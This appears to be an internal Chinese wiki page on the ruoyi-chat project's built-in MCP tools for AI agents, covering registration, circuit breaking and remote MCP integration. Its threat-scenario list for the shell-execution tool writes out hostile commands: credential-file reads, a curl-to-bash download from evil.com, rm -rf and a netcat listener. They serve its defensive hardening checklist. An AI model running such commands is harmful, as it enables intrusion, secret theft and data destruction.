---
topic: modules/chat-mcp-tools
title: ruoyi-chat — 内置 MCP 工具详解
updated: 2026-09-04
raw:
  - raw/chat-source/mcp-tools-catalog.md
  - raw/chat-source/mcp-tool-provider-service.md
  - raw/chat-source/mcp-sse-config.md
---

# ruoyi-chat — 内置 MCP 工具详解

6 个内置 MCP 工具暴露给 Langchain4j agents，让 AI 能操作文件系统 + 执行 shell。本篇是 [modules/chat.md § 内置 MCP 工具](../modules/chat.md) 的扩展。

参见 [mcp-tools-catalog.md](../raw/chat-source/mcp-tools-catalog.md) 完整清单。

## 6 个内置工具

| 工具 | 用途 | 危险等级 |
|---|---|---|
| `ReadFileTool` | 读取文件 | 🟢 低 |
| `WriteFileTool` | 写入文件（覆盖） | 🟡 中 |
| `EditFileTool` | 编辑文件（局部） | 🟡 中 |
| `ListDirectoryTool` | 列出目录 | 🟢 低 |
| `DeleteFileTool` | 删除文件 | 🔴 高 |
| `ExecuteCommandTool` | 执行 shell 命令 | 🔴 **极高** |

## 工具注册机制

通过 `LangChain4jMcpToolProviderService` 加载（参见 [mcp-tool-provider-service.md](../raw/chat-source/mcp-tool-provider-service.md)）：

```java
// 工具类型：BUILTIN（内置） / LOCAL（本地 MCP server） / REMOTE（远程 MCP server）
public class LangChain4jMcpToolProviderService {
    public ToolProvider getToolProvider(List<Long> toolIds) {
        // 1. 从 DB 读工具配置（mcp_tool 表）
        // 2. 分类：BUILTIN → BuiltinToolRegistry
        //          LOCAL → stdio MCP client
        //          REMOTE → HTTP/SSE MCP client
        // 3. 失败计数 + 自动熔断（5 分钟）
    }
}
```

**关键能力**：
- 工具健康检查（每次调用 ping）
- 失败计数（连续 3 次失败 → 禁用 5 分钟）
- BUILTIN / LOCAL / REMOTE 三类统一

## ExecuteCommandTool 的安全风险

`ExecuteCommandTool` 给 AI agent shell 执行能力。**这是项目里最危险的工具**。

参见：[.claude/agents/security-reviewer.md](../../.claude/agents/security-reviewer.md) § P0 — 密钥硬编码。

### 风险场景

1. **信息泄漏**：`cat /etc/passwd`、`env`（泄露环境变量，可能含 API key）
2. **远程下载**：`curl http://evil.com/script | bash`（下载恶意代码）
3. **文件系统破坏**：`rm -rf /` 或 `rm -rf /var/lib/mysql`
4. **权限提升**：`sudo xxx`（如果有 sudo 配置错误）
5. **网络渗透**：`nc -lvp 4444`（反弹 shell）

### 必须的安全措施

生产环境开启此工具前，必须：

- [ ] **白名单**：仅允许特定命令（如 `git status`、`npm test`）
- [ ] **沙箱**：独立用户 / 容器 / chroot
- [ ] **超时**：每个命令 < 30 秒
- [ ] **资源限制**：CPU / 内存 / IO
- [ ] **审计日志**：所有命令记录到 `sys_oper_log`（参见 [system-listener-runner.md § UserActionListener](../modules/system-listener-runner.md)）
- [ ] **路径限制**：禁止访问 `/etc`、`/var/lib/mysql` 等敏感目录

### 当前实现状态

**仓库现有代码可能只做了基础实现**——**没有完整的沙箱 / 白名单 / 超时**。**生产部署前必须二次开发**。

参见：[security-reviewer agent 文档 § 工具越权](../../.claude/agents/security-reviewer.md)。

## BuiltinToolProvider 模式

```java
public class BuiltinToolProvider {
    private final Map<String, Tool> builtinTools = new ConcurrentHashMap<>();

    @PostConstruct
    public void init() {
        // 通过 @Component 自动扫描注册的工具类
        builtinTools.put("read_file", new ReadFileTool());
        builtinTools.put("write_file", new WriteFileTool());
        // ...
    }

    public Tool getTool(String name) {
        return builtinTools.get(name);
    }
}
```

**演进**：从硬编码注册 → 注解扫描（`@Component` + `@Tool`）→ 动态发现（数据库）。

## 文件工具设计原则

`ReadFileTool` / `WriteFileTool` / `EditFileTool` 应该：

1. **路径白名单**：只允许访问 `/workspace/`、`/tmp/`、`/data/` 等
2. **大小限制**：单文件 < 10MB
3. **编码检测**：UTF-8 / GBK 自动判断
5. **备份机制**：写入前备份（`*.bak`）

## 与本地 MCP server 的集成

项目支持**本地 stdio MCP server**（如 `npx -y @modelcontextprotocol/server-filesystem`），通过 `McpTransport` 启动子进程：

```java
McpTransport transport = new StdioMcpTransport.Builder()
    .command(List.of("npx", "-y", "@modelcontextprotocol/server-filesystem", "/workspace"))
    .build();
McpClient client = new DefaultMcpClient.Builder()
    .transport(transport)
    .build();
```

**注意**：stdio 模式需要 `npx` 可用，且会消耗一个 Node.js 子进程。建议生产用 SSE/HTTP MCP server。

参见：[mcp-sse-config.md](../raw/chat-source/mcp-sse-config.md) § McpSseConfig。

## 远程 MCP server（HTTP/SSE）

通过 `StreamableHttpMcpTransport` 连接远程 MCP server：

```java
McpTransport transport = new StreamableHttpMcpTransport.Builder()
    .url("https://mcp.example.com/api")
    .build();
```

参见：[mcp-sse-config.md](../raw/chat-source/mcp-sse-config.md)、[mcp-tool-provider-service.md § activeClients](../raw/chat-source/mcp-tool-provider-service.md)。

## 添加新内置工具

参考 [.claude/skills/ai-module-add/SKILL.md](../../.claude/skills/ai-module-add/SKILL.md) § MCP 工具暴露：

1. 在 `org.ruoyi.mcp.tools` 创建 `@Component` 类
2. 方法用 `@Tool(name="...", value="...")` 标注
3. 在 `BuiltinToolProvider` 注册（`builtinTools.put(...)`）
4. 在 `McpServerConfig` 的 `mcpServer(...)` Bean 里把工具类加进 `List.of(...)`
5. **必须**加 `@SaCheckPermission` 或方法内 `StpUtil.checkPermission(...)` —— 不能仅靠路径拦截

## 工具健康监控

参见 [mcp-tool-provider-service.md § 健康状态](../raw/chat-source/mcp-tool-provider-service.md)：

- `toolHealthStatus` —— 工具ID → 是否健康
- `toolFailureCount` —— 工具ID → 失败计数
- `toolDisabledUntil` —— 工具ID → 禁用截止时间

**熔断策略**：连续 3 次失败 → 禁用 5 分钟。生产环境可调（参见 `MAX_FAILURE_COUNT`、`DISABLE_DURATION`）。

## 已知约束

- **本地 MCP server 需要 npx**：CI / Docker 必须装 Node.js
- **stdio 模式无连接复用**：每次调用都 spawn 子进程（慢）
- **HTTP 模式需要 MCP server URL**：自部署或第三方服务
- **执行命令工具是双刃剑**：开启 = 全功能 AI agent；不开启 = AI 只能查不能改
- **工具描述要清晰**：`@Tool(value="...")` 是 LLM 决策依据，描述模糊会反复选错工具